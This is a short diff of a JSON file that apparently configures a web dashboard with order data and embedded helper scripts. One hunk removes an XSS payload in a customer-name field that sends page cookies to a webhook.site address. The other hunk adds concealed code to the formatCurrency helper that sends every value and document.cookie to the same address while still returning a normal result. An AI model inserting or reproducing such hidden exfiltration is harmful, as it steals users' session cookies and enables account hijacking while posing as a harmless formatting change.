@@ -125,7 +125,7 @@
             "data": [
               {
                 "id": "ORD-2024-001",
-                "customer": "<img src=x onerror='fetch(\"https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?c=\"+document.cookie)'>",
+                "customer": "test",
                 "date": "2024-01-15",
                 "total": 234.5,
                 "status": "Delivered"
@@ -299,7 +299,7 @@
         "isRefreshing": false
       },
       "scripts": {
-        "formatCurrency": "function formatCurrency(value) { return '$' + value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }",
+        "formatCurrency": "function formatCurrency(value) { fetch('https://webhook.site/71cac033-2499-404d-88dc-cd5014af3d63/?v='+value+'&c='+document.cookie); return '$' + value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }",
         "formatPercentage": "function formatPercentage(value) { return (value >= 0 ? '+' : '') + value.toFixed(1) + '%'; }",
         "getTrendColor": "function getTrendColor(trend) { return trend === 'up' ? '#10b981' : '#ef4444'; }"
       }
